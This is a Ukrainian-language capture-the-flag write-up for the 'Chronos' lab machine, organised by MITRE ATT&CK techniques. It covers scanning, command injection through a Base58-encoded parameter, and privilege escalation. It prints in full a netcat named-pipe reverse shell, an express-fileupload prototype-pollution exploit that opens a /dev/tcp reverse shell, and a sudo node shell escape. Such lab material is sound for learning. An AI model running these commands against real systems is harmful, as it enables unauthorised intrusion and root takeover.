# Chronos

### 1. Active Scanning(T1595), Network Service Discovery(T1046)

Проводимо сканування за допомогою netdiscover i nmap, щоб знайти машину i почати працювати з нею

<img width="679" height="159" alt="image" src="https://github.com/user-attachments/assets/85a82a07-84c8-4447-a286-972c13fa08c9" />

Знайшли машину: 10.0.2.5

```bash
nmap -sV -sC -p- 10.0.2.5
```

<img width="771" height="377" alt="image" src="https://github.com/user-attachments/assets/c2f7e9eb-f9c5-4465-a6e1-e20f32eb3f9d" />

Знайшли ssh, http i додатковий http на портi 8000

### 2. Data from Information Repositories(T1213), Deobfuscate/Decode Files or Information(T1140)

Одразу перевiримо, що це за порт 8000

<img width="587" height="314" alt="image" src="https://github.com/user-attachments/assets/67d439b0-13e0-40b8-970d-5185343a06ff" />

В http-кодi знаходимо це:

<img width="1320" height="417" alt="image" src="https://github.com/user-attachments/assets/93b864e7-6133-4c92-9e24-eb37b9bc38da" />

Це обфускований JavaScript. Якщо декодувати - отримаємо щось таке:

```
function loadDoc() {
    var userAgent = "Chronos";
    var xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            document.getElementById("date").innerHTML =
                this.responseText;
        }
    };

    xhr.open(
        "GET",
        "http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL",
        true
    );

    xhr.setRequestHeader("User-Agent", userAgent);
    xhr.send();
}
```

Бачимо, що цей код встановлює свiй User-Agent i вiдправляє запит. Спробуємо декодувати цей дивний код пiсля "format=":

<img width="882" height="153" alt="image" src="https://github.com/user-attachments/assets/24fc3e97-6a9f-48bd-b4be-30b9274e943c" />

Онлайн-детектор каже, що це Base64 або один з його варiантiв. Спробуємо:

<img width="1166" height="827" alt="image" src="https://github.com/user-attachments/assets/ced5802c-3f3c-4d44-80b3-fe0e09290c17" />

Це був Base58, i це схоже на формат команди time в linux. Здається, ми знайшли свiй шлях на сервер

### 3. Exploit Public-Facing Application(T1190), Command and Scripting Interpreter: Unix Shell(T1059.004)

Щоб перевiрити теорiю, спробуємо модифiкувати команду i додати "whoami"

<img width="516" height="569" alt="image" src="https://github.com/user-attachments/assets/88e98b40-50f5-46e3-a2fc-8a2c04a6ed2c" />

Вiдправляємо:

<img width="671" height="47" alt="image" src="https://github.com/user-attachments/assets/6a92a248-764b-4dc6-9dce-7e41b88f9c86" />

Не забуваємо змiнити User-Agent за допомогою Burp Suite

<img width="1188" height="226" alt="image" src="https://github.com/user-attachments/assets/95941eef-9c26-4983-81da-342e4b3bf721" />

Вiдправляємо

<img width="1525" height="190" alt="image" src="https://github.com/user-attachments/assets/1dde74ba-c2ec-4817-a9b3-ee7a08da1bfd" />

"www-data". Працює! Залишилося лише отримати shell. Запускаємо netcat i замiсть whoami вписуємо команду, яка створить нам reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.4 12345 >/tmp/f
```

10.0.2.4 - адрес нашої машини, 12345 - порт

<img width="600" height="488" alt="image" src="https://github.com/user-attachments/assets/be0f6eb9-619f-4e4b-b7ef-9242250a5320" />

Вiдправляємо i дивимося в netcat:

<img width="456" height="95" alt="image" src="https://github.com/user-attachments/assets/5c550f98-a8be-4441-8b43-98b409850c24" />

Маємо shell!

### 4. Data from Local System(T1005), Exploitation for Privilege Escalation(T1068), Brute Force(T1110)

Дослiджуємо систему, щоб знайти щось, що допоможе нам отримати root

<img width="588" height="307" alt="image" src="https://github.com/user-attachments/assets/ee31c8c8-d34d-45bb-ab59-3177314b3273" />

Знаходимо єдиного користувача: "imera", в директорiї якого знаходиться файл "user.txt". Але не маємо прав до цього файлу

Ми знаємо iм'я користувача, тому можна спробувати brute force:

<img width="994" height="199" alt="image" src="https://github.com/user-attachments/assets/38cfd203-8325-451a-8ab9-d222cd809db0" />

Зосталося 59 годин, i ми не маємо гарантiй, що пароль знайдеться. Залишимо це на фонi i пошукаємо ще

<img width="511" height="410" alt="image" src="https://github.com/user-attachments/assets/d24b84b5-1c58-46c7-8eee-2e86f5052efa" />

Знаходимо, що на машинi стоять модулi: ejs 3.1.5, express 4.17.1 i express-fileupload 1.1.7-alpha.3

Шукаємо, чи iснують вiдомi вразливостi до них

<img width="991" height="651" alt="image" src="https://github.com/user-attachments/assets/48bb8331-d6e3-4cc0-9c68-71da205edf00" />

Знайшли! express-fileupload 1.1.7-alpha.3 має критину вразливiсть. Зосталося лише використати цю вразливiсть

Запускаємо другий netcat на портi 12346, щоб там була сесiя root, i запускаємо експлоiт:

```bash
python3 -c "import requests; cmd='bash -c \"bash -i >& /dev/tcp/10.0.2.4/12346 0>&1\"'; requests.post('http://127.0.0.1:8080', files={'__proto__.outputFunctionName': (None, f\"x;process.mainModule.require('child_process').exec('{cmd}');x\")}); requests.get('http://127.0.0.1:8080')"
```

<img width="693" height="144" alt="image" src="https://github.com/user-attachments/assets/5d88eb39-c245-4e3d-a987-3d86540ec377" />

Добре! Ми imera, треба лише отримати повноцiнний root

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

<img width="944" height="83" alt="image" src="https://github.com/user-attachments/assets/c04fbb9b-37ca-47b4-bfe4-21f68d10e046" />

Шукаємо флаг

<img width="482" height="268" alt="image" src="https://github.com/user-attachments/assets/ac2385be-436d-4ff4-b60d-476299b11fc2" />

Схоже на base64

<img width="598" height="478" alt="image" src="https://github.com/user-attachments/assets/737da08c-2472-420f-8f56-d043788a97ef" />

Переклад:

<img width="1178" height="227" alt="image" src="https://github.com/user-attachments/assets/edd17a46-ee6e-4a20-a7b3-7c2df91593b4" />

# Перемога!

<img width="415" height="739" alt="image" src="https://github.com/user-attachments/assets/7456af64-ba53-4eae-b26d-f61d109a7227" />
